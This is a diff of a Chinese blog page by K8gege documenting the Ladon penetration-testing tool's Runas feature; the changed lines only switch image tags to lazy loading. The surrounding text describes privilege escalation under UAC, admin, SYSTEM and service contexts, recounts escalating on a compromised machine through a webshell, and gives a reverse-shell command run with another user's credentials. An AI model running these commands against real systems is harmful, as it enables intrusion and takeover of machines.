@@ -73,7 +73,7 @@ Ladon内置Runas允许用户用其他权限运行指定的工具和程序。系�
     https://www.cnblogs.com/skins/CodingLife/images/title-yellow.png)">
     <div class="main-header-box">
         <a class="header-avatar" href="/" title="K8gege">
-            <img alt="logo" class="img-responsive" referrerpolicy="no-referrer" data-original="/../images/avatar.png">
+            <img alt="logo" class="img-responsive" referrerpolicy="no-referrer" class="lazyload" data-src="/../images/avatar.png">
 			<h3 class="K8tilte">K8哥哥</h3>
         </a>
         <div class="branding">
@@ -187,25 +187,25 @@ Runas在不同权限下模拟其它用户权限有一定区别，如UAC下模拟
 <p>非内置管理员用户在UAC权限下执行命令继承UAC权限，无法通过该用户权限添加用户<br>
 但是模拟内置管理员Administrator权限则不受UAC影响，可以通过该权限添加用户。</p>
 <figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Ladon Runas k8gege k8gege520 <span class="built_in">whoami</span></span><br><span class="line">Ladon Runas Administrator k8gege520 <span class="built_in">whoami</span></span><br></pre></td></tr></tbody></table></figure>
-<p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/exe/RunasUac.PNG"></p>
+<p><img alt="使用http访问查看图片" class="lazyload" data-src="/k8img/Ladon/exe/RunasUac.PNG"></p>
 <h3 id="Admin权限">Admin权限</h3>
 <p>管理员权限下模拟非内置管理员用户权限，是可以添加用户的<br>
 Ladon Runas k8gege k8gege520 whoami</p>
-<p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/exe/RunasAdmin.PNG"></p>
+<p><img alt="使用http访问查看图片" class="lazyload" data-src="/k8img/Ladon/exe/RunasAdmin.PNG"></p>
 <h3 id="System权限">System权限</h3>
 <p>SYSTEM权限下模拟非内置管理员用户权限，是可以添加用户的<br>
 Ladon Runas k8gege k8gege520 whoami</p>
-<p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/exe/RunasAdmin.PNG"></p>
+<p><img alt="使用http访问查看图片" class="lazyload" data-src="/k8img/Ladon/exe/RunasAdmin.PNG"></p>
 <h3 id="Service权限">Service权限</h3>
 <p>服务权限下模拟登陆自己添加的管理员用户执行CMD命令<br>
 Ladon Runas k8gege k8gege520 whoami</p>
 <p>PS：实战某台机器曾经提权至管理员，由于提权不稳定曾给其添加了一个用户，发现再次使用Potato依旧无法以高极限执行命令，突然想起之前已加入一个管理员用户，使用非交互式Runas执行命令提权（已有目标帐密在低权限webshell下以高权限用户执行命令同理）</p>
-<p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/exe/exp/lpe/runas_lpe_2003.png"></p>
+<p><img alt="使用http访问查看图片" class="lazyload" data-src="/k8img/Ladon/exe/exp/lpe/runas_lpe_2003.png"></p>
 <h3 id="反弹Shell">反弹Shell</h3>
 <p>版本Ladon&gt;=7.8<br>
 LadonGUI–Netcat监听,执行以下命令即可以指定用户权限反弹shell<br>
 Ladon RunasCS user pass cmd.exe ip port<br>
-<img alt="使用http访问查看图片" data-original="/k8img/Ladon/exe/RunasNC.PNG"></p>
+<img alt="使用http访问查看图片" class="lazyload" data-src="/k8img/Ladon/exe/RunasNC.PNG"></p>
 <h3 id="结论">结论</h3>
 <p>在UAC下需要模拟管理员权限执行命令，先过UAC或使用内置管理员<br>
 管理员或SYSTEM权限模拟的用户具备什么权限，它就有对应的权限</p>
@@ -217,7 +217,7 @@ Ladon RunasCS user pass cmd.exe ip port<br>
 7.0版本：<a href="https://k8gege.org/Download">https://k8gege.org/Download</a><br>
 8.0版本：K8小密圈</p>
 <div style="text-align: center; width: 710px; border: green solid 0px;">
-<img alt="" style="display: inline-block;width: 250px;height: 300px;" data-original="https://k8gege.org/img/k8team.jpg">
+<img alt="" style="display: inline-block;width: 250px;height: 300px;" class="lazyload" data-src="https://k8gege.org/img/k8team.jpg">
 </div>
 
     </div>
